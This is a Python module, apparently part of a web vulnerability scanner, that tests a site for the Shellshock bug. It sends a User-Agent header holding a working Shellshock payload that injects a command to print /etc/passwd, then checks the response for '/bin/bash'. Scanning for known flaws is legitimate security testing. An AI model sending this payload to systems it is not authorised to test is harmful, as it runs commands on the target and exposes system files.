import contextlib
import re

from request import request
from utils import output


class Shellshock:
    def __init__(self, agent, proxy, redirect, timeout, url, cookie):
        self.agent = agent
        self.url = url
        self.cookie = cookie
        self.output = output.Output()
        self.request = request.Request(
            agent='() { foo;}; echo Content-Type: text/plain ; echo ; cat /etc/passwd',
            proxy=proxy,
            redirect=redirect,
            timeout=timeout
        )

    def run(self):
        info = {
            'name': 'Shellshock',
            'fullname': 'Shellshock',
            'author': 'Momo Outaadi (M4ll0k)',
            'description': 'Checking Shellshock Vulnerability'
        }
        self.output.test('Scanning shellshock vuln..')
        with contextlib.suppress(Exception):
            resp = self.request.send(
                url=self.url,
                method="GET",
                payload=None,
                headers=None,
                cookies=self.cookie
            )
            if resp.status_code == 200 and re.search(r'.*?/bin/bash', resp.content.decode('utf-8'), re.I):
                self.output.plus('That site is my be vulnerable to Shellshock.')
